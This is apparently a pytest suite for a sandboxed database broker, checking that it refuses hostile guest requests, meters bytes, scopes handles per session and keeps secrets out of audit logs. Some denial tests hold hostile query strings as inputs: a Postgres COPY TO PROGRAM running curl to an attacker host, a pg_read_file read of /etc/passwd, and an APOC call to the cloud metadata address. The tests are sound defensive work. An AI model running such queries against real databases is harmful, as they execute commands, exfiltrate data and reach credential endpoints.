"""Tests for the host DB broker.

The denials come first on purpose. The broker's job is to be the component that
holds the credentials while assuming its caller is hostile and already fully
compromised, so the tests that matter are the ones proving a refusal actually
fires — and, where the record says the refusal is structural, proving the backend
was never touched at all.

Every collaborator here is an in-memory fake. The fakes are **test doubles, not
security surfaces**: `FakePostgres` and `FakeNeo4j` are dictionaries with a
method, no driver, no socket, no credential. They exist so the broker's own
controls can be exercised without a database; nothing they do is evidence about
what a real driver would do.
"""

from __future__ import annotations

import hashlib
import json
import time
from dataclasses import dataclass
from typing import Any

import pytest

from repl_sandbox.broker import (
    ALGEBRA_OPS,
    BROKER_OPS,
    MAX_ARGS_BYTES,
    Broker,
    DispatchTable,
    ResultSet,
)
from repl_sandbox.config import BrokerCaps, ByteLedgerCaps, SandboxConfig
from repl_sandbox.errors import AuthError, CapBytesError, DeniedError

SECRET = "sk-live-0xDEADBEEF-belief-row"
GUEST_CID = 42
OTHER_CID = 43


# ---------------------------------------------------------------------------
# Test doubles
# ---------------------------------------------------------------------------


@dataclass
class FakeSession:
    cid: int


class FakeSessionTable:
    """Test double for `repl_sandbox.session.SessionTable`. Not a security surface."""

    def __init__(self, cids: tuple[int, ...] = (GUEST_CID,)):
        self._cids = set(cids)

    def session_for(self, cid: int) -> FakeSession:
        if cid not in self._cids:
            raise AuthError(f"no session is bound to cid {cid}")
        return FakeSession(cid)


@dataclass
class FakeHandle:
    id: str
    kind: str


@dataclass
class FakeEntry:
    id: str
    cid: int
    kind: str
    referent: Any
    state: str = "live"


class FakeHandleTable:
    """Test double for `repl_sandbox.handles.HandleTable`. Not a security surface.

    CID-scoped and fail-closed, matching DATA_MODEL section 2, so the broker's
    cross-CID behaviour is exercised. The real table's refusal class is its own;
    the broker propagates whatever `SandboxError` it raises.
    """

    def __init__(self) -> None:
        self.entries: dict[str, FakeEntry] = {}

    def allocate(self, cid: int, kind: str, referent: Any, parents: tuple = ()) -> FakeHandle:
        handle_id = f"h{len(self.entries) + 1}"
        self.entries[handle_id] = FakeEntry(handle_id, cid, kind, referent)
        return FakeHandle(handle_id, kind)

    def resolve(self, cid: int, handle_id: str) -> FakeEntry:
        entry = self.entries.get(handle_id)
        if entry is None or entry.cid != cid or entry.state != "live":
            raise DeniedError("handle does not resolve for this session")
        return entry


class FakeByteLedger:
    """Test double for `repl_sandbox.ledger.ByteLedger`. Not a security surface."""

    def __init__(self, raise_after: int | None = None):
        self.charges: list[tuple[int, int]] = []
        self.raise_after = raise_after
        self.total = 0

    def charge_inbound(self, cid: int, nbytes: int) -> None:
        self.charges.append((cid, nbytes))
        self.total += nbytes
        if self.raise_after is not None and self.total > self.raise_after:
            raise CapBytesError("inbound byte ledger is spent")


class FakeAuditLog:
    """Test double for `repl_sandbox.audit.AuditLog`. Not a security surface."""

    def __init__(self, fail: bool = False):
        self.lines: list[tuple[int, str, dict]] = []
        self.fail = fail

    def record(self, cid: int, op: str, **fields: Any) -> None:
        if self.fail:
            raise RuntimeError("audit sink is down")
        self.lines.append((cid, op, fields))

    @property
    def last(self) -> dict:
        return self.lines[-1][2]


class FakePostgres:
    """Test double standing in for the credentialed Postgres backend.

    It is not a database and not a boundary. `read_only` is the posture
    declaration `Broker.__init__` checks; in a real backend that attribute would
    accompany a `NOSUPERUSER` role and a server-side `statement_timeout`, neither
    of which exists here.
    """

    read_only = True

    def __init__(self, result: ResultSet | None = None, delay: float = 0.0, raises: Exception | None = None):
        self.result = result if result is not None else ResultSet([[1]], [{"name": "n"}], 1)
        self.delay = delay
        self.raises = raises
        self.calls: list[tuple[str, list]] = []

    def run_query(self, sql: str, params: list) -> ResultSet:
        self.calls.append((sql, list(params)))
        if self.delay:
            time.sleep(self.delay)
        if self.raises is not None:
            raise self.raises
        return self.result

    def run_cypher(self, query: str, params: dict) -> ResultSet:  # pragma: no cover
        raise NotImplementedError


class FakeNeo4j:
    """Test double standing in for the credentialed Neo4j backend. Not a boundary."""

    access_mode = "READ"

    def __init__(self, result: ResultSet | None = None):
        self.result = result if result is not None else ResultSet([["n"]], [{"name": "n"}], 1)
        self.calls: list[tuple[str, dict]] = []

    def run_query(self, sql: str, params: list) -> ResultSet:  # pragma: no cover
        raise NotImplementedError

    def run_cypher(self, query: str, params: dict) -> ResultSet:
        self.calls.append((query, dict(params)))
        return self.result


@dataclass
class Harness:
    broker: Broker
    pg: FakePostgres
    neo: FakeNeo4j
    handles: FakeHandleTable
    ledger: FakeByteLedger
    audit: FakeAuditLog
    dispatch: DispatchTable

    def call(self, op: str, args: dict, cid: int = GUEST_CID, **envelope: Any) -> dict:
        request = {"v": 1, "req_id": "r1", "op": op, "args": args}
        request.update(envelope)
        return self.broker.handle_request(cid, request)


def make_harness(
    pg: FakePostgres | None = None,
    neo: FakeNeo4j | None = None,
    broker_caps: BrokerCaps | None = None,
    byte_caps: ByteLedgerCaps | None = None,
    ledger: FakeByteLedger | None = None,
    audit: FakeAuditLog | None = None,
    grants: tuple[str, ...] = ("run_query", "run_cypher", "resolve_meta", "slice", "materialize"),
) -> Harness:
    config = SandboxConfig(
        broker_caps=broker_caps or BrokerCaps(),
        byte_caps=byte_caps or ByteLedgerCaps(),
    )
    pg = pg or FakePostgres()
    neo = neo or FakeNeo4j()
    handles = FakeHandleTable()
    ledger = ledger or FakeByteLedger()
    audit = audit or FakeAuditLog()
    dispatch = DispatchTable()
    for op in grants:
        dispatch.grant(GUEST_CID, op, f"ref::{op}")
    broker = Broker(
        config,
        FakeSessionTable((GUEST_CID, OTHER_CID)),
        handles,
        ledger,
        audit,
        {"postgres": pg, "neo4j": neo},
        dispatch,
    )
    return Harness(broker, pg, neo, handles, ledger, audit, dispatch)


def error_code(response: dict) -> str:
    assert response["ok"] is False, response
    return response["error"]["code"]


# ---------------------------------------------------------------------------
# Denials
# ---------------------------------------------------------------------------


def test_ungranted_op_is_refused_before_any_backend_is_touched():
    harness = make_harness(grants=())
    response = harness.call("run_query", {"sql": "SELECT 1"})
    assert error_code(response) == "denied"
    assert harness.pg.calls == []
    assert harness.audit.last["decision"] == "denied"


def test_denial_is_structural_no_grant_means_no_dispatch_ref():
    dispatch = DispatchTable()
    assert dispatch.allows(GUEST_CID, "run_query") is False
    with pytest.raises(DeniedError):
        dispatch.resolve_ref(GUEST_CID, "run_query")
    dispatch.grant(GUEST_CID, "run_query", "ref::run_query")
    assert dispatch.resolve_ref(GUEST_CID, "run_query") == "ref::run_query"
    dispatch.revoke(GUEST_CID, "run_query")
    with pytest.raises(DeniedError):
        dispatch.resolve_ref(GUEST_CID, "run_query")


def test_a_grant_to_another_cid_does_not_route():
    harness = make_harness(grants=())
    harness.dispatch.grant(OTHER_CID, "run_query", "ref::run_query")
    assert error_code(harness.call("run_query", {"sql": "SELECT 1"})) == "denied"
    assert harness.pg.calls == []


def test_unknown_op_is_denied():
    harness = make_harness()
    assert error_code(harness.call("run_shell", {})) == "denied"
    assert harness.pg.calls == []


def test_forged_dispatch_ref_in_the_envelope_is_refused():
    harness = make_harness()
    response = harness.call(
        "run_query", {"sql": "SELECT 1"}, dispatch_ref="ref::run_shell"
    )
    assert error_code(response) == "denied"
    assert "dispatch_ref" in response["error"]["message"]
    assert harness.pg.calls == []


def test_forged_dispatch_ref_inside_args_is_refused():
    harness = make_harness()
    response = harness.call(
        "run_query", {"sql": "SELECT 1", "dispatch_ref": "ref::run_shell"}
    )
    assert error_code(response) == "denied"
    assert harness.pg.calls == []


@pytest.mark.parametrize("key", ["cid", "session", "session_id"])
def test_caller_supplied_identity_keys_are_refused(key):
    harness = make_harness()
    response = harness.call("run_query", {"sql": "SELECT 1", key: OTHER_CID})
    assert error_code(response) == "denied"
    assert harness.pg.calls == []


def test_routing_uses_the_brokers_own_table():
    harness = make_harness()
    harness.call("run_query", {"sql": "SELECT 1"})
    assert harness.audit.last["dispatch_ref"] == "ref::run_query"


def test_unknown_cid_is_an_auth_failure():
    harness = make_harness()
    response = harness.broker.handle_request(
        999, {"v": 1, "req_id": "r1", "op": "run_query", "args": {"sql": "SELECT 1"}}
    )
    assert error_code(response) == "auth"
    assert harness.pg.calls == []
    assert harness.audit.lines[-1][0] == 999


def test_cross_cid_handle_does_not_resolve():
    harness = make_harness()
    handle = harness.handles.allocate(OTHER_CID, "result-set", ResultSet([[SECRET]], [], 1))
    response = harness.call("slice", {"handle": {"id": handle.id, "kind": handle.kind}, "span": [0, 1]})
    assert error_code(response) == "denied"
    assert SECRET not in json.dumps(response)


def test_copy_to_program_is_denied():
    harness = make_harness()
    response = harness.call(
        "run_query", {"sql": "COPY (SELECT 1) TO PROGRAM 'curl http://attacker/'"}
    )
    assert error_code(response) == "denied"
    assert harness.pg.calls == []


def test_pg_read_file_is_denied():
    harness = make_harness()
    response = harness.call("run_query", {"sql": "SELECT pg_read_file('/etc/passwd')"})
    assert error_code(response) == "denied"
    assert harness.pg.calls == []


def test_apoc_load_json_is_denied_by_default():
    harness = make_harness()
    response = harness.call(
        "run_cypher",
        {"query": "CALL apoc.load.json('http://169.254.169.254/') YIELD value RETURN value"},
    )
    assert error_code(response) == "denied"
    assert harness.neo.calls == []


def test_unbounded_variable_length_path_is_denied():
    harness = make_harness()
    response = harness.call("run_cypher", {"query": "MATCH (a)-[*]-(b) RETURN b"})
    assert error_code(response) == "denied"
    assert harness.neo.calls == []


def test_row_cap_refuses_an_oversized_result():
    pg = FakePostgres(ResultSet([[1], [2], [3]], [{"name": "n"}], 3))
    harness = make_harness(pg=pg, broker_caps=BrokerCaps(max_rows=2))
    response = harness.call("run_query", {"sql": "SELECT n FROM t"})
    assert error_code(response) == "denied"
    assert "row cap" in response["error"]["message"]
    assert harness.handles.entries == {}


def test_result_byte_cap_refuses_an_oversized_result():
    pg = FakePostgres(ResultSet([[SECRET]], [{"name": "n"}], 1))
    harness = make_harness(pg=pg, broker_caps=BrokerCaps(max_result_bytes=8))
    response = harness.call("run_query", {"sql": "SELECT n FROM t"})
    assert error_code(response) == "denied"
    assert SECRET not in json.dumps(response)
    assert harness.handles.entries == {}


def test_slice_refuses_when_the_inbound_ledger_is_spent():
    pg = FakePostgres(ResultSet([[SECRET]], [{"name": "n"}], 1))
    harness = make_harness(pg=pg, ledger=FakeByteLedger(raise_after=0))
    handle = harness.call("run_query", {"sql": "SELECT n FROM t"})["result"]["handle"]
    response = harness.call("slice", {"handle": handle, "span": [0, 1]})
    assert error_code(response) == "cap_bytes"
    assert SECRET not in json.dumps(response)


def test_materialize_refuses_rather_than_trimming_over_the_per_call_cap():
    pg = FakePostgres(ResultSet([[SECRET]], [{"name": "n"}], 1))
    harness = make_harness(pg=pg, byte_caps=ByteLedgerCaps(inbound_per_call=8))
    handle = harness.call("run_query", {"sql": "SELECT n FROM t"})["result"]["handle"]
    response = harness.call("materialize", {"handle": handle})
    assert error_code(response) == "cap_bytes"
    assert SECRET not in json.dumps(response)
    assert harness.ledger.charges == []


def test_oversized_args_blob_is_denied():
    harness = make_harness()
    response = harness.call(
        "run_query", {"sql": "SELECT 1", "params": ["x" * (MAX_ARGS_BYTES + 1)]}
    )
    assert error_code(response) == "denied"
    assert "exceed the broker bound" in response["error"]["message"]
    assert harness.pg.calls == []


@pytest.mark.parametrize(
    "request_body",
    [
        None,
        "not an object",
        [1, 2, 3],
        {},
        {"v": 2, "req_id": "r", "op": "run_query", "args": {}},
        {"v": 1, "op": "run_query", "args": {}},
        {"v": 1, "req_id": 7, "op": "run_query", "args": {}},
        {"v": 1, "req_id": "r", "args": {}},
        {"v": 1, "req_id": "r", "op": "", "args": {}},
        {"v": 1, "req_id": "r", "op": "run_query"},
        {"v": 1, "req_id": "r", "op": "run_query", "args": []},
        {"v": 1, "req_id": "x" * 500, "op": "run_query", "args": {}},
    ],
)
def test_malformed_envelopes_are_denied_and_never_raise(request_body):
    harness = make_harness()
    response = harness.broker.handle_request(GUEST_CID, request_body)
    assert response["v"] == 1
    assert response["ok"] is False
    assert response["error"]["code"] == "denied"
    assert harness.pg.calls == []


def test_a_malformed_req_id_still_gets_a_correlatable_envelope():
    harness = make_harness()
    response = harness.broker.handle_request(GUEST_CID, {"v": 1, "op": "run_query", "args": {}})
    assert response["req_id"] == "invalid"


def test_an_overrun_statement_deadline_refuses_the_result():
    pg = FakePostgres(ResultSet([[SECRET]], [], 1), delay=0.02)
    harness = make_harness(pg=pg, broker_caps=BrokerCaps(statement_timeout_ms=1))
    response = harness.call("run_query", {"sql": "SELECT n FROM t"})
    assert error_code(response) == "timeout"
    assert harness.handles.entries == {}


def test_a_backend_exception_becomes_upstream_without_echoing_its_text():
    pg = FakePostgres(raises=RuntimeError(f"duplicate key (value)=({SECRET})"))
    harness = make_harness(pg=pg)
    response = harness.call("run_query", {"sql": "SELECT n FROM t"})
    assert error_code(response) == "upstream"
    assert SECRET not in json.dumps(response)
    assert SECRET not in json.dumps(harness.audit.lines, default=str)


def test_a_backend_declaring_a_write_posture_is_refused_at_construction():
    class WritablePostgres(FakePostgres):
        read_only = False

    with pytest.raises(Exception) as excinfo:
        make_harness(pg=WritablePostgres())
    assert "read-only" in str(excinfo.value)


def test_a_neo4j_backend_declaring_write_access_mode_is_refused_at_construction():
    class WriteModeNeo4j(FakeNeo4j):
        access_mode = "WRITE"

    with pytest.raises(Exception) as excinfo:
        make_harness(neo=WriteModeNeo4j())
    assert "READ" in str(excinfo.value)


def test_a_failed_audit_sink_fails_the_call_closed():
    pg = FakePostgres(ResultSet([[SECRET]], [], 1))
    harness = make_harness(pg=pg, audit=FakeAuditLog(fail=True))
    response = harness.call("run_query", {"sql": "SELECT n FROM t"})
    assert error_code(response) == "upstream"
    assert SECRET not in json.dumps(response)


# ---------------------------------------------------------------------------
# The handle-first surface
# ---------------------------------------------------------------------------


def test_run_query_returns_a_handle_and_metadata_and_no_rows():
    pg = FakePostgres(ResultSet([[SECRET], ["second"]], [{"name": "body"}], 2))
    harness = make_harness(pg=pg)
    response = harness.call("run_query", {"sql": "SELECT body FROM ast_nodes"})
    result = response["result"]
    assert set(result) == {"handle", "rowcount", "schema"}
    assert result["rowcount"] == 2
    assert result["schema"] == [{"name": "body"}]
    assert SECRET not in json.dumps(response)
    assert harness.ledger.charges == []


def test_run_cypher_returns_a_handle_and_metadata_and_no_rows():
    neo = FakeNeo4j(ResultSet([[SECRET]], [{"name": "n"}], 1))
    harness = make_harness(neo=neo)
    response = harness.call("run_cypher", {"query": "MATCH (n:Belief) RETURN n LIMIT 1"})
    assert set(response["result"]) == {"handle", "rowcount", "schema"}
    assert SECRET not in json.dumps(response)


def test_only_slice_and_materialize_return_content():
    # The property is an absence: no other operation in the surface has a path
    # from a referent to the guest, which is what holds under total injection.
    assert Broker.CONTENT_OPS == frozenset({"slice", "materialize"})
    pg = FakePostgres(ResultSet([[SECRET]], [{"name": "body"}], 1))
    harness = make_harness(pg=pg)
    handle = harness.call("run_query", {"sql": "SELECT body FROM t"})["result"]["handle"]
    for op, args in [
        ("run_query", {"sql": "SELECT body FROM t"}),
        ("run_cypher", {"query": "MATCH (n) RETURN n"}),
        ("resolve_meta", {"handle": handle}),
    ]:
        assert op not in Broker.CONTENT_OPS
        result = harness.call(op, args)["result"]
        assert "rows" not in result and "text" not in result


def test_resolve_meta_returns_shape_and_length_only():
    pg = FakePostgres(ResultSet([[SECRET], ["b"]], [{"name": "body"}], 2))
    harness = make_harness(pg=pg)
    handle = harness.call("run_query", {"sql": "SELECT body FROM t"})["result"]["handle"]
    response = harness.call("resolve_meta", {"handle": handle})
    assert response["result"] == {"shape": [2, 1], "length": 2, "schema": [{"name": "body"}]}
    assert SECRET not in json.dumps(response)


def test_the_handle_round_trip_ends_at_slice():
    pg = FakePostgres(ResultSet([[SECRET], ["second"]], [{"name": "body"}], 2))
    harness = make_harness(pg=pg)
    handle = harness.call("run_query", {"sql": "SELECT body FROM t"})["result"]["handle"]
    response = harness.call("slice", {"handle": handle, "span": {"start": 0, "end": 1}})
    assert response["result"] == {"rows": [[SECRET]], "truncated": False}
    assert harness.ledger.charges == [(GUEST_CID, len(json.dumps([[SECRET]]).encode()))]
    assert harness.audit.last["bytes"] == harness.ledger.charges[0][1]
    assert harness.audit.last["rows"] == 1


def test_slice_windows_by_half_open_span():
    pg = FakePostgres(ResultSet([["a"], ["b"], ["c"]], [], 3))
    harness = make_harness(pg=pg)
    handle = harness.call("run_query", {"sql": "SELECT x FROM t"})["result"]["handle"]
    assert harness.call("slice", {"handle": handle, "span": [1, 3]})["result"]["rows"] == [["b"], ["c"]]


def test_slice_caps_the_window_at_the_row_cap():
    harness = make_harness(broker_caps=BrokerCaps(max_rows=2))
    # Allocated directly: the row cap on `run_query` result assembly would have
    # refused this result outright, and what is under test here is the window.
    allocated = harness.handles.allocate(
        GUEST_CID, "result-set", ResultSet([["a"], ["b"], ["c"]], [], 3)
    )
    handle = {"id": allocated.id, "kind": allocated.kind}
    result = harness.call("slice", {"handle": handle, "span": [0, 3]})["result"]
    assert result["rows"] == [["a"], ["b"]]
    assert result["truncated"] is True


def test_slice_trims_to_the_per_call_byte_cap_and_flags_it():
    rows = [["a" * 40] for _ in range(10)]
    pg = FakePostgres(ResultSet(rows, [], 10))
    harness = make_harness(pg=pg, byte_caps=ByteLedgerCaps(inbound_per_call=120))
    handle = harness.call("run_query", {"sql": "SELECT x FROM t"})["result"]["handle"]
    result = harness.call("slice", {"handle": handle, "span": [0, 10]})["result"]
    assert result["truncated"] is True
    assert 0 < len(result["rows"]) < 10
    assert len(json.dumps(result["rows"]).encode()) <= 120


@pytest.mark.parametrize("span", [None, [1], [2, 1], {"start": 0}, ["0", "1"], [-1, 2], [True, False]])
def test_a_malformed_span_is_denied(span):
    pg = FakePostgres(ResultSet([[SECRET]], [], 1))
    harness = make_harness(pg=pg)
    handle = harness.call("run_query", {"sql": "SELECT x FROM t"})["result"]["handle"]
    response = harness.call("slice", {"handle": handle, "span": span})
    assert error_code(response) == "denied"
    assert SECRET not in json.dumps(response)


def test_materialize_returns_the_whole_referent_and_charges_it():
    pg = FakePostgres(ResultSet([["a"], ["b"]], [], 2))
    harness = make_harness(pg=pg)
    handle = harness.call("run_query", {"sql": "SELECT x FROM t"})["result"]["handle"]
    response = harness.call("materialize", {"handle": handle})
    assert response["result"] == {"rows": [["a"], ["b"]], "truncated": False}
    assert harness.ledger.charges == [(GUEST_CID, len(json.dumps([["a"], ["b"]]).encode()))]


def test_driver_values_are_normalised_before_they_reach_the_frame_codec():
    import datetime
    import decimal

    rows = [[datetime.date(2026, 7, 22), decimal.Decimal("1.5"), float("inf")]]
    pg = FakePostgres(ResultSet(rows, [], 1))
    harness = make_harness(pg=pg)
    handle = harness.call("run_query", {"sql": "SELECT a, b, c FROM t"})["result"]["handle"]
    result = harness.call("materialize", {"handle": handle})["result"]
    assert result["rows"] == [["2026-07-22", "1.5", "inf"]]
    json.dumps(result, allow_nan=False)  # the codec would have to do this


# ---------------------------------------------------------------------------
# Handle-typed parameters
# ---------------------------------------------------------------------------


def test_a_handle_parameter_is_substituted_host_side_for_run_query():
    harness = make_harness()
    handle = harness.handles.allocate(GUEST_CID, "scalar", SECRET)
    response = harness.call(
        "run_query",
        {"sql": "SELECT id FROM t WHERE body = $1", "params": [{"id": handle.id, "kind": "scalar"}]},
    )
    assert response["ok"] is True
    assert harness.pg.calls[-1][1] == [SECRET]
    # The guest composed over a value it never received.
    assert SECRET not in json.dumps(response)


def test_a_handle_parameter_is_substituted_host_side_for_run_cypher():
    harness = make_harness()
    handle = harness.handles.allocate(GUEST_CID, "scalar", SECRET)
    response = harness.call(
        "run_cypher",
        {"query": "MATCH (n) WHERE n.body = $b RETURN n", "params": {"b": {"id": handle.id, "kind": "scalar"}}},
    )
    assert response["ok"] is True
    assert harness.neo.calls[-1][1] == {"b": SECRET}
    assert SECRET not in json.dumps(response)


def test_a_handle_shaped_parameter_from_another_session_is_denied():
    harness = make_harness()
    handle = harness.handles.allocate(OTHER_CID, "scalar", SECRET)
    response = harness.call(
        "run_query",
        {"sql": "SELECT 1 FROM t WHERE body = $1", "params": [{"id": handle.id, "kind": "scalar"}]},
    )
    assert error_code(response) == "denied"
    assert harness.pg.calls == []


def test_ordinary_map_parameters_are_not_mistaken_for_handles():
    harness = make_harness()
    params = {"filter": {"id": "abc", "since": 3}}
    response = harness.call(
        "run_cypher", {"query": "MATCH (n) WHERE n.id = $filter.id RETURN n", "params": params}
    )
    assert response["ok"] is True
    assert harness.neo.calls[-1][1] == params


# ---------------------------------------------------------------------------
# Audit
# ---------------------------------------------------------------------------


def test_every_call_is_audited_by_cid_with_a_digest_and_counts():
    pg = FakePostgres(ResultSet([[SECRET]], [{"name": "body"}], 1))
    harness = make_harness(pg=pg)
    args = {"sql": "SELECT body FROM ast_nodes"}
    harness.call("run_query", args)
    cid, op, fields = harness.audit.lines[-1]
    assert (cid, op) == (GUEST_CID, "run_query")
    assert fields["decision"] == "ok"
    assert fields["req_id"] == "r1"
    assert fields["dispatch_ref"] == "ref::run_query"
    expected = hashlib.sha256(
        json.dumps(args, sort_keys=True, default=repr).encode("utf-8")
    ).hexdigest()
    assert fields["args_digest"] == expected
    assert set(fields) >= {"rows", "bytes", "elapsed_ms"}


def test_the_audit_line_carries_no_argument_or_row_content():
    pg = FakePostgres(ResultSet([[SECRET]], [], 1))
    harness = make_harness(pg=pg)
    harness.call("run_query", {"sql": f"SELECT body FROM t WHERE body = '{SECRET}'"})
    handle = harness.handles.entries["h1"]
    harness.call("slice", {"handle": {"id": handle.id, "kind": handle.kind}, "span": [0, 1]})
    serialised = json.dumps(harness.audit.lines, default=str)
    assert SECRET not in serialised
    assert "SELECT body" not in serialised


def test_a_denial_is_audited_with_its_taxonomy_code():
    harness = make_harness()
    harness.call("run_query", {"sql": "SELECT pg_read_file('/etc/passwd')"})
    assert harness.audit.last["decision"] == "denied"
    assert harness.audit.last["error_code"] == "denied"


# ---------------------------------------------------------------------------
# Envelope shape
# ---------------------------------------------------------------------------


def test_the_success_envelope_is_v1():
    harness = make_harness()
    response = harness.call("run_query", {"sql": "SELECT 1"})
    assert response["v"] == 1
    assert response["req_id"] == "r1"
    assert response["ok"] is True
    assert "error" not in response


def test_the_error_object_is_exactly_the_spine_shape():
    harness = make_harness(grants=())
    response = harness.call("run_query", {"sql": "SELECT 1"})
    assert set(response["error"]) == {"code", "message", "retryable"}
    assert response["error"]["retryable"] is False
    assert set(response) == {"v", "req_id", "ok", "error"}


def test_the_handler_table_is_exactly_the_declared_op_set():
    harness = make_harness()
    assert set(harness.broker._handlers) == BROKER_OPS
    assert Broker.CONTENT_OPS < BROKER_OPS
    assert BROKER_OPS.isdisjoint(ALGEBRA_OPS)


# ---------------------------------------------------------------------------
# Against the real collaborators
#
# The fakes above isolate the broker's own controls; these run it on the
# sibling modules it will actually be constructed with, so a drift in
# `HandleEntry.referent`, in `SessionTable.session_for`, in the ledger's raise,
# or in the algebra's op set fails here rather than in a deployment.
# ---------------------------------------------------------------------------


def make_live_harness(**caps: Any) -> Harness:
    from repl_sandbox.audit import AuditLog
    from repl_sandbox.handles import HandleTable
    from repl_sandbox.ledger import ByteLedger
    from repl_sandbox.session import SessionTable

    config = SandboxConfig(**caps)
    audit = AuditLog()
    sessions = SessionTable(audit=audit)
    sessions.bind(GUEST_CID, "session-a")
    sessions.bind(OTHER_CID, "session-b")
    handles = HandleTable(config.handle_ttl_s, audit=audit)
    ledger = ByteLedger(config.byte_caps, audit=audit)
    dispatch = DispatchTable()
    for op in (
        "run_query",
        "run_cypher",
        "resolve_meta",
        "slice",
        "materialize",
        "narrow",
        "project",
        "locate",
    ):
        dispatch.grant(GUEST_CID, op, f"ref::{op}")
    pg = FakePostgres(ResultSet([[SECRET], ["second"]], [{"name": "body"}], 2))
    neo = FakeNeo4j()
    broker = Broker(config, sessions, handles, ledger, audit, {"postgres": pg, "neo4j": neo}, dispatch)
    return Harness(broker, pg, neo, handles, ledger, audit, dispatch)


def test_live_round_trip_over_the_real_handle_table_and_ledger():
    harness = make_live_harness()
    response = harness.call("run_query", {"sql": "SELECT body FROM ast_nodes"})
    handle = response["result"]["handle"]
    assert set(handle) == {"id", "kind"}
    assert SECRET not in json.dumps(response)

    meta = harness.call("resolve_meta", {"handle": handle})["result"]
    assert meta["length"] == 2

    sliced = harness.call("slice", {"handle": handle, "span": [0, 1]})["result"]
    assert sliced["rows"] == [[SECRET]]
    assert harness.ledger.used(GUEST_CID)["inbound"] > 0


def test_live_cross_cid_handle_is_refused_by_the_real_table():
    harness = make_live_harness()
    handle = harness.call("run_query", {"sql": "SELECT body FROM t"})["result"]["handle"]
    response = harness.broker.handle_request(
        OTHER_CID, {"v": 1, "req_id": "r1", "op": "slice", "args": {"handle": handle, "span": [0, 1]}}
    )
    assert response["ok"] is False
    assert SECRET not in json.dumps(response)


def test_live_real_ledger_stops_a_run_of_slices():
    harness = make_live_harness(byte_caps=ByteLedgerCaps(inbound_total=40, inbound_per_call=40))
    handle = harness.call("run_query", {"sql": "SELECT body FROM t"})["result"]["handle"]
    codes = [
        harness.call("slice", {"handle": handle, "span": [0, 1]}).get("error", {}).get("code")
        for _ in range(4)
    ]
    assert "cap_bytes" in codes


def test_live_algebra_op_routes_and_returns_a_handle():
    harness = make_live_harness()
    handle = harness.call("run_query", {"sql": "SELECT body FROM t"})["result"]["handle"]
    response = harness.call("project", {"handle": handle["id"], "cols": ["body"]})
    assert response["ok"] is True
    assert set(response["result"]["handle"]) == {"id", "kind"}
    assert SECRET not in json.dumps(response)


def test_live_narrow_routes_from_the_guest_and_returns_a_handle():
    """The reachability this rename exists to restore.

    `narrow` is the algebra's windowing op: it returns a handle, reads no
    referent, and charges no inbound bytes. While it was named `slice` the
    broker's `ALGEBRA_OPS` subtraction removed it from the routable set, so this
    call could not be made at all — the only way to see a window was to pay for
    its content. The assertions below are, in order: it routes, it returns a
    handle and not content, no row crossed, and nothing was charged.
    """
    harness = make_live_harness()
    handle = harness.call("run_query", {"sql": "SELECT body FROM t"})["result"]["handle"]
    before = harness.ledger.used(GUEST_CID)["inbound"]

    response = harness.call("narrow", {"handle": handle["id"], "start": 0, "end": 1})

    assert response["ok"] is True, response
    assert set(response["result"]) == {"handle"}
    assert set(response["result"]["handle"]) == {"id", "kind"}
    assert response["result"]["handle"]["id"] != handle["id"]
    assert SECRET not in json.dumps(response)
    assert harness.ledger.used(GUEST_CID)["inbound"] == before

    # The derived handle is a first-class operand: the algebra stayed closed.
    again = harness.call(
        "project", {"handle": response["result"]["handle"]["id"], "cols": ["body"]}
    )
    assert again["ok"] is True, again


def test_live_slice_still_returns_content_and_charges_the_inbound_ledger():
    """The other half of the split: `slice` is unchanged, and still the metered sink."""
    harness = make_live_harness()
    handle = harness.call("run_query", {"sql": "SELECT body FROM t"})["result"]["handle"]
    before = harness.ledger.used(GUEST_CID)["inbound"]

    response = harness.call("slice", {"handle": handle, "span": [0, 1]})

    assert response["ok"] is True, response
    assert response["result"]["rows"] == [[SECRET]]
    assert harness.ledger.used(GUEST_CID)["inbound"] > before


def test_live_address_op_fails_closed_without_an_evaluator():
    harness = make_live_harness()
    handle = harness.call("run_query", {"sql": "SELECT body FROM t"})["result"]["handle"]
    response = harness.call("locate", {"handle": handle["id"], "pattern": "x"})
    assert error_code(response) == "denied"


def test_live_audit_log_holds_no_content():
    harness = make_live_harness()
    handle = harness.call("run_query", {"sql": f"SELECT body FROM t WHERE b = '{SECRET}'"})["result"]["handle"]
    harness.call("slice", {"handle": handle, "span": [0, 1]})
    serialised = json.dumps(harness.audit.entries(), default=str)
    assert SECRET not in serialised
    assert "SELECT body" not in serialised
